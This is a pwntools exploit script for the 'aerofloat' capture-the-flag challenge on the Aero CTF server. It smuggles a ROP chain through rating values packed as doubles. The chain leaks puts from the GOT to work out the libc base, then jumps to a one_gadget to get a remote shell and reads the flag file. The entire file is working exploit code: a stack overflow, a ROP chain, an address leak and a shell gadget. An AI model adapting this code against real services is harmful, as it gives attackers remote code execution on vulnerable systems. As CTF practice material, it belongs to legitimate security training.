from pwn import *

context.binary = elf = ELF('./aerofloat')

puts_got = 0x404018
pop_rdi = 0x00000000004015bb
puts_plt = 0x0000000000401030
main = 0x0000000000401192
def l2d(val):
    return str(struct.unpack("d", p64(val))[0])

# env = {
#     'LD_PRELOAD': os.path.abspath('libc.so.6')
# }

# p = process(['./ld-linux-x86-64.so.2', './aerofloat'], env=env)
# gdb.attach(p,'''
#     handle SIGALRM ignore
#     init-gef
#     b *0x00000000004013ee
# ''')

p = remote("tasks.aeroctf.com", 33017)

p.sendlineafter("name: ", "A")


def set_rating(ticket, val):
    p.sendlineafter("> ", '1')
    p.sendlineafter("id: ", ticket)
    p.sendlineafter("rating: ", val)

for _ in xrange(12):
    set_rating('1','1.1')

set_rating('1', l2d(pop_rdi))
set_rating(p64(puts_got),l2d(puts_plt))
set_rating(p64(main), '1.1')

p.sendlineafter('> ', '4')
p.recvuntil("Exit\n> ")
leak = u64(p.recvline(False) + '\x00\x00')
libc_base = leak - 0x74050
print hex(libc_base)
one_gadget = libc_base + 0xe664b

p.sendlineafter("name: ", "A")

for _ in xrange(12):
    set_rating('1','1.1')

set_rating('1', l2d(0x00000000004013ee))
set_rating(p64(one_gadget), '1.1')
# set_rating(, l2d(libc_base+0x4f440))
p.sendlineafter('> ', '4')
p.sendline('cat /tmp/flag.txt')

x = p.recvuntil('}')
print x

p.interactive()